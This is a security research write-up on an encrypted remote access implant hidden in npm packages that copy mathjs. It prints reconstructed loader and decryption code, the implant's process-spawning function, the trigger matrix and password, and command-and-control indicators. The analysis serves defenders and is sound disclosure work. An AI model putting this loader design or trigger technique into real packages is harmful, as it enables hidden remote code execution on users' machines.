---
title: Why does mathmain need an encrypted loader?
link: https://safedep.io/mathmain-encrypted-loader/
source: hnrss-org-frontpage
published: 2026-09-21T18:33:44Z
updated: 2026-09-21T18:33:44Z
first_seen: 2026-09-22T04:43:15.388238719Z
authors:
- abhisek
summary: 'Article URL: https://safedep.io/mathmain-encrypted-loader/ Comments URL: https://news.ycombinator.com/item?id=49791378 Points: 120 # Comments: 35'
content: extracted
html: 2026-09-21-why-does-mathmain-need-an-encrypted-loader.html
preview:
  file: 2026-09-21-why-does-mathmain-need-an-encrypted-loader.preview-43c02e8211ce.webp
  width: 256
  height: 144
  color: '#041819'
images:
- source: https://safedep.io/images/mathmain-encrypted-loader-banner.png
  original:
    file: 2026-09-21-why-does-mathmain-need-an-encrypted-loader.image-f37d157ffca0.png
    width: 1200
    height: 675
  color: '#000202'
---

We found a remote access implant hidden inside `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)`, an npm package that copies the popular `mathjs` library. The malicious code ships encrypted. A caller activates the loader with matrix data that produces a specific password. When the key matches, the package decrypts a payload and runs it. The implant receives encrypted code from an operator and starts it on the host. It uses a public chat service and a blockchain network for its command channel. This post shows how we found the loader, how we decrypted it, what the payload does, and the indicators you can use to find it.

We started with a [SafeDep analysis of `mathmain`](https://app.safedep.io/community/malysis/01M2Q39B7G9RZSKZ16EZEGBB14) on September 17, 2026. The package looked like a copy of `mathjs` with a different name and obfuscated code. One added call in the solver led us to the loader.

## A solver calls a type check

Near the end of `lusolve()`, we found an extra call in the CommonJS build. The solver had already calculated its result. It then passed data from the lower triangular matrix to `removeSolveValidation()`:

```
// Readable reconstruction: recovered strings and renamed local variables.l && (q = removeSolveValidation(l._data));return x;
```

Here, `l` holds the lower triangular matrix and `x` holds the result. The solver returns `x` unchanged. It assigns the extra call’s return value to `q`, but does not use `q` again.

We followed `removeSolveValidation()` to `isGraph(x)` in `lib/cjs/utils/is.js`. This file contains checks such as `isMatrix` and `isNumber`. The added `isGraph()` function decrypts and loads code:

```
// Readable reconstruction: recovered strings and renamed local variables.const STAGE1_BLOB = 'IapMCmvlemBnFaU+3GZ4oF2xOhnczTlDWTO3oCfrHkWp1lSpHdCaeG0qn2neIoTetyRJtQ==';function isGraph(x) {  const name = validEvent(STAGE1_BLOB, JSON.stringify(x));  const target = path.join(__dirname, name);  const mod = require(event(target, JSON.stringify(x)));  return (x && mod.validGraph(JSON.stringify(x))) || false;}
```

`isGraph()` converts its input to a JSON string and uses that string as a password. It first decrypts a filename. It then passes the file path and password to `event()`, and loads the returned path with `require()`.

We have made the loader snippets easier to read by restoring strings and renaming local variables. The hashes at the end of this post identify the original files.

## The matrix data becomes a password

In `lib/cjs/utils/event.js`, we found the decryption functions. They use `scrypt` to turn the password into a key of 256 bits. They then decrypt the data with Advanced Encryption Standard in Galois/Counter Mode (AES-GCM):

```
// Readable reconstruction: recovered strings and renamed local variables.const key = crypto.scryptSync(password, salt, 32);const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);decipher.setAuthTag(tag);return Buffer.concat([decipher.update(ciphertext), decipher.final()]);
```

The encrypted data has a fixed layout: a salt of 16 bytes, an initialization vector of 12 bytes, and an authentication tag of 16 bytes. The ciphertext follows these fields. The package stores the whole sequence as base64 text.

For calls through the solver, the password is `JSON.stringify(L._data)`. A caller can supply `L` through the object form of `lusolve()`. So the caller must pass matrix data that produces the correct password. We found no password stored in the visible loader.

The encrypted filename has eight bytes of ciphertext. We first suspected `graph.js`, a file beside the loader whose name also takes eight bytes. The decryption described below confirmed that filename.

## The loader writes and runs the file

On success, the `event()` helper decrypts the file, writes the result to disk, and returns the output path:

```
// Readable reconstruction: recovered strings and renamed local variables.const plaintext = eventEmitter(file, password);const dir = path.dirname(path.resolve(file));const base = path.basename(file).replace(/^enc_/, '');const outPath = path.join(dir, base);fs.writeFileSync(outPath, plaintext);return outPath;
```

If decryption or writing fails, `event()` catches the error and returns the original path.

If the filename has no `enc_` prefix, the helper overwrites the encrypted file with the decrypted code. The `require()` call in `isGraph()` then loads it. That code would run with the same permissions as the Node.js process.

Three added files contain base64 data instead of normal JavaScript:

| Path under `lib/cjs/utils/` | Size of ciphertext in bytes |
| --------------------------- | --------------------------- |
| `graph.js`                  | 20,918                      |
| `fraction.js`               | 9,084                       |
| `bignumber/type.js`         | 1,179,416                   |

We found no reference to the last two files in the visible loader. The decrypted `graph.js` loads them as later stages, as the payload section shows.

We found no install hooks in the manifest. Importing the package through the path we reviewed does not activate the loader either. The solver must first pass its validation and calculation steps to reach the added call. If the password is wrong, `validEvent()` fails its authentication check before the helper writes any file.

## The same loader appears in two more packages

We searched the npm registry and found two more packages: `mathsbase` and `math-universe`. Across five versions, we found identical loader files, trigger code, solver changes, and two large encrypted files.

The encrypted `graph.js` in `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` differs from the other copies. The shared files connect these releases. They do not tell us who added the loader or whether someone took over a publisher’s account.

On September 17, npm served `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` as the default release. That version did not contain this loader. Checking only the default version would have missed the code in `1.0.1`.

On September 19, we checked npm’s download counts for all three packages. These totals cover September 12–18, 2026, across all versions of each package.

| Package                                                                                       | Reported downloads |
| --------------------------------------------------------------------------------------------- | ------------------ |
| [`mathmain`](https://api.npmjs.org/downloads/point/2026-09-12:2026-09-18/mathmain)           | 605,157            |
| [`mathsbase`](https://api.npmjs.org/downloads/point/2026-09-12:2026-09-18/mathsbase)         | 1,923,059          |
| [`math-universe`](https://api.npmjs.org/downloads/point/2026-09-12:2026-09-18/math-universe) | 569,730            |

npm also reported [zero downloads across the entire registry for September 17](https://api.npmjs.org/downloads/range/2026-09-17:2026-09-18). This makes the earlier zero for `mathmain` unreliable. Our public dependency searches found no consumers within their coverage. Our saved download statistics do not identify who generated the traffic. These counts do not tell us how many systems installed the packages or whether the encrypted code ran.

## The loader is not in the GitHub source

The `mathsbase` and `math-universe` packages each link to a public GitHub repository. We read both. Neither reviewed commit contains the loader:

| Repository                            | Reviewed commit                            |
| ------------------------------------- | ------------------------------------------ |
| `github[.]com/tinystar8/mathsbase`    | `560d97e66140dbf817e04284a7a0c58757d1202e` |
| `github[.]com/mathubio/math-universe` | `da99dd46501c75ba6102a51ef60ebb922174da32` |

The public `math-universe` source ends its solver like this:

```
// mathubio/math-universe, commit da99dd46501c75ba6102a51ef60ebb922174da32// src/function/algebra/solver/lusolve.js; original source excerpt.if (q) {  x._data = csIpvec(q, x._data);}return x;
```

The extra `removeSolveValidation()` call is not there. The npm build has it. The reviewed GitHub source does not. This difference does not establish when or how someone inserted the loader into the npm build.

We also looked for a program that calls the solver with the trigger. We searched GitHub code, lockfiles, and dependency services. We found none. Private projects, and code that search engines miss, stay out of reach.

## Our first attempts did not find the password

We tested 16,922 possible passwords against the encrypted filename. Some came from matrices with zero diagonal entries, which our earlier search had left out.

In a second search, we tested 533 possible passwords against all five distinct encrypted blobs, including the older `graph.js`. We tried common passwords and numeric arrays from the solver’s tests. Neither search found a password that passed the authentication check.

Some passwords appeared in both searches.

We checked the tools with test data and known passwords. The searches finished. None of our guesses worked. The successful password was outside the candidates we tested.

## Cracking the encryption

The password is the JSON form of a matrix lower factor `L`. JFrog first [reported](https://research.jfrog.com/post/equation-of-compromise/) the input that produces it. We then reproduced the result against the `mathmain` files.

The recovered trigger is a 3 by 3 Pascal matrix.

```
A = [[1, 1, 1],     [1, 2, 3],     [1, 3, 6]]
```

A caller passes `A` to `lusolve()`. The solver runs an LU decomposition of `A`. The lower triangular factor `L` becomes `[[1, 0, 0], [1, 1, 0], [1, 0.5, 1]]`. The loader turns `L` into a JSON string. That string is the password.

We confirmed this against the real files. The password is the JSON form of `L`.

```
// SafeDep reproduction against [email protected].const A = [  [1, 1, 1],  [1, 2, 3],  [1, 3, 6],];const L = lup(A).L.valueOf(); // [[1,0,0],[1,1,0],[1,0.5,1]]const password = JSON.stringify(L); // '[[1,0,0],[1,1,0],[1,0.5,1]]'const blob = Buffer.from(STAGE1_BLOB, 'base64');const key = crypto.scryptSync(password, blob.subarray(0, 16), 32);const d = crypto.createDecipheriv('aes-256-gcm', key, blob.subarray(16, 28));d.setAuthTag(blob.subarray(28, 44));const name = Buffer.concat([d.update(blob.subarray(44)), d.final()]).toString();// name === 'graph.js'
```

The password decrypted the filename to `graph.js`. It also decrypted the three payload files in `mathmain` and in `math-universe`. The `mathmain` payload matches the `math-universe` payload byte for byte. `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` uses the same password with different encrypted data. So the same password unlocks the whole family.

## Payload analysis

The decrypted files form a small remote access implant. Each file has one job. The findings below come from our own static review of the decrypted code.

The decrypted `graph.js` is the first stage. The loader runs it with `require()` after decryption. It reads host data with `os` and `fs`. It generates an X25519 key pair with the Node `crypto` module through `generateKeyPairSync` and `diffieHellman`. It uses `child_process` to start detached Node.js processes and manage child processes. It reads a smart contract on the Base Sepolia test network with a bundled copy of `ethers`. It reports to Slack `chat.postMessage` and to `api.telegram.org`. It then loads `bignumber/type.js` and `fraction.js` as later stages. The network details sit in the file as base64 text.

```
# Decoded constants from decrypted graph.js ([email protected]).Base Sepolia contract   0xac0bfC4C48A679b667732128278EACBA1c191894RPC (Infura)            base-sepolia.infura[.]io/v3/dc7257d09fab42eca2c354c32fec1938RPC (Alchemy)           base-sepolia.g.alchemy[.]com/v2/D2-TbkB2m05WXSnSDOCDITelegram bot            8961878831:AAG4... (secret redacted)Slack bot               xoxb-11307403103236-11289767127959-... (secret redacted)
```

The decrypted `bignumber/type.js` is a copy of the `ethers` library. The file carries the marker `ethers/5.7.2` and the `JsonRpcProvider` and `secp256k1` symbols. The implant uses this library to read the smart contract.

The decrypted `fraction.js` is the Slack agent. It reads `CHAT_PASSWORD` from `process.argv[2]`, the parent process ID from `process.argv[3]`, and the trigger password from `process.argv[4]`. The parent supplies these arguments when it starts the agent. `CHAT_PASSWORD` is a shared secret derived with X25519. The agent uses the trigger password to decrypt its Slack bot token and channel ID.

```
// Decrypted lib/cjs/utils/fraction.js; recovered strings, original identifiers.const CHAT_PASSWORD = process['argv'][0x2],  PARENT_PID = Number(process['argv'][0x3]);
```

The agent polls Slack’s `conversations.history` endpoint every 10 seconds. It checks sender identifiers and decrypts accepted message text into JSON packets. A start packet opens a transfer, chunk packets supply file content, and an end packet joins the chunks. The agent writes the result to `lib/cjs/utils/subwatcher` and starts it with Node.js:

```
// Decrypted lib/cjs/utils/fraction.js; recovered strings, original identifiers.function runProcess(_0x490de7) {  console['log'](_0x490de7);  const _0x1335c7 = spawn(process['execPath'], [_0x490de7], {    detached: !![],    stdio: 'ignore',    windowsHide: !![],  });  _0x1335c7['unref']();}
```

The blockchain path also decrypts remote data, writes `subwatcher`, and starts it with Node.js. These paths let an operator deliver code for execution on a host where the required setup succeeds. We recovered the implant, but not the later code delivered through these channels. We therefore cannot say what tasks an operator ran on a victim.

## How the trigger reaches a victim

The loader stays inert until a caller runs the solver with an input that produces the factor `L`. A normal import does not reach the added code. If a call reaches the loader with the wrong password, the filename authentication check fails before any payload write. The password is the JSON form of `L`, so the Pascal matrix is not the only trigger. A caller can pass `L` as the coefficient matrix, because its own lower factor is `L` again. A caller can also supply `L` through the object form of `lusolve()`. Both inputs give the same password.

The package holds the encrypted implant. A second package or another caller could supply the trigger matrix. This is a possible delivery path; we have not found the caller used in an attack.

We did not find that caller in public code. Our GitHub and dependency searches returned no project that calls the solver with the trigger. Private code and removed projects stay outside that search.

## Investigation timeline

All times are in Coordinated Universal Time (UTC). We took publication times from the npm registry metadata.

| Date and time             | Event                                                                                                                |
| ------------------------- | -------------------------------------------------------------------------------------------------------------------- |
| August 26, 2026, 08:14    | `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` published. No matching loader found.           |
| August 27, 2026, 07:44    | `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` published with the loader and encrypted files. |
| September 15, 2026, 03:38 | `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` published without the matching loader.         |
| September 16, 2026, 12:06 | `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` published with the loader.                     |
| September 16, 2026, 13:39 | `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` published with the loader.                     |
| September 16, 2026, 14:14 | `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` published with the loader, after `1.0.2`.      |
| September 17, 2026, 06:53 | `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` published with matching files.                 |
| September 17, 2026        | Source review, consumer searches, and further decryption attempts completed. No plaintext recovered.                 |
| September 19, 2026        | npm reported 605,157 downloads of `mathmain` for September 18.                                                       |
| September 21, 2026        | JFrog published its analysis. It recovered the trigger matrix.                                                       |
| September 21, 2026        | SafeDep reproduced the decryption and read the `mathmain` payload.                                                   |

## Indicators of compromise

Use these indicators to find the packages, the loader, and the decrypted implant. A match on a package or a hash does not prove the code ran on a host. A caller must first trigger the loader.

### Malicious packages

SafeDep analyzed the loader in these versions. The archive SHA-256 comes from the npm tarball.

| npm package version                                                   | Archive SHA-256                                                    |
| --------------------------------------------------------------------- | ------------------------------------------------------------------ |
| `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` | `1723a0df210ac61281a504f3a07ec3605d20151631e0635cc344cacc71019135` |
| `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` | `03e13cdedd9c33e6fed25092b1ec7dcf11cc5962c0fbb6b3e90ba95bfec1b034` |
| `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` | `7e5e1bcdc6a7b0e3437269a236b49ef2be4f77081c7de5130d503c103fd6be69` |
| `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` | `bfe772e7ee044fd6f0bdf53e83f44aad7c9ee1925baf0cf4d884a312aa9ba50e` |
| `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` | `4eb1d59df7dc80dbe3ec154481e61e8824422037092c188f0cc146b543615a66` |

### The trigger and the password

A caller activates the loader with one matrix. The password is the JSON form of that matrix LU lower factor.

| Item           | Value                                                                      |
| -------------- | -------------------------------------------------------------------------- |
| Trigger matrix | `[[1,1,1],[1,2,3],[1,3,6]]`                                                |
| Password       | `[[1,0,0],[1,1,0],[1,0.5,1]]`                                              |
| Stage-1 blob   | `IapMCmvlemBnFaU+3GZ4oF2xOhnczTlDWTO3oCfrHkWp1lSpHdCaeG0qn2neIoTetyRJtQ==` |

### Loader files

These two file hashes match across the five versions listed above.

| File                     | SHA-256                                                            |
| ------------------------ | ------------------------------------------------------------------ |
| `lib/cjs/utils/event.js` | `ab66c98e8ed5235feb963ec8845765f62f5f26b1c58c266c409767e53bcb5ccd` |
| `lib/cjs/utils/is.js`    | `5d9e952c51875d2b897eedc22b002b94ab21c8004d513bc99ce3a885f8a01dae` |

### Encrypted payload files

The base64 blobs sit under `lib/cjs/utils/`. `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` and the three `math-universe` versions share one set. `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)` ships a different `graph.js` blob.

| File                | SHA-256                                                            | Deployment |
| ------------------- | ------------------------------------------------------------------ | ---------- |
| `graph.js`          | `ed9b078594393d09d91ee008366ca75e3017cca18c79af99c5b294c61db67f06` | A          |
| `fraction.js`       | `09773ee7db70216b778b15cfcd94cb1df8963eddd4a47b801c96f986651699e6` | A          |
| `bignumber/type.js` | `ca4fe552da461fec5b51d5964d979699f06888499be442f209125853dff3e0e1` | A          |
| `graph.js`          | `0aa46d32e4b479cc09f97cc66a1f12ca96b0497a7eb6ffc6b46ed3ef80e3c83b` | B          |

### Decrypted payload files

These hashes cover the plaintext we recovered from Deployment A. A host where the loader ran may hold files with these hashes on disk.

| File                | SHA-256                                                            |
| ------------------- | ------------------------------------------------------------------ |
| `graph.js`          | `1e0f09c84aaf573627c003ce0f086517c3ea980cbea02f8ff918b1cc0d7e0bbb` |
| `fraction.js`       | `6fd655d7196880fc5783f9dbb62b428baf220c2781970be54044376330be7af3` |
| `bignumber/type.js` | `6b1ad71bc3765dd272ea2ac63c1ea6ed97091ba0067d0b3e2294e1b34177cb25` |

### Command and control

We recovered these endpoints from the decrypted `graph.js` files. Deployment A covers `mathmain` and `math-universe`. Deployment B covers `[[email protected]](https://safedep.io/cdn-cgi/l/email-protection)`. RPC means remote procedure call. We redact the secret half of the two bot tokens.

| Deployment | Type           | Value                                                           |
| ---------- | -------------- | --------------------------------------------------------------- |
| A          | Smart contract | `0xac0bfC4C48A679b667732128278EACBA1c191894` (Base Sepolia)     |
| A          | RPC (Infura)   | `base-sepolia.infura[.]io/v3/dc7257d09fab42eca2c354c32fec1938`  |
| A          | RPC (Alchemy)  | `base-sepolia.g.alchemy[.]com/v2/D2-TbkB2m05WXSnSDOCDI`         |
| A          | Telegram bot   | `8961878831` (token redacted)                                   |
| A          | Slack bot      | `xoxb-11307403103236-11289767127959-...` (secret redacted)      |
| B          | Smart contract | `0xE390863Dac96a7118C71227C2b099B50cF602D31` (Ethereum Sepolia) |
| B          | RPC (Alchemy)  | `eth-sepolia.g.alchemy[.]com/v2/D2-TbkB2m05WXSnSDOCDI`          |
| B          | Slack bot      | `xoxb-11307403103236-11289767127959-...` (secret redacted)      |

Both deployments use the same Alchemy project key `D2-TbkB2m05WXSnSDOCDI`. This shared key links the deployments to the same Alchemy project. It does not establish the identity or number of operators.
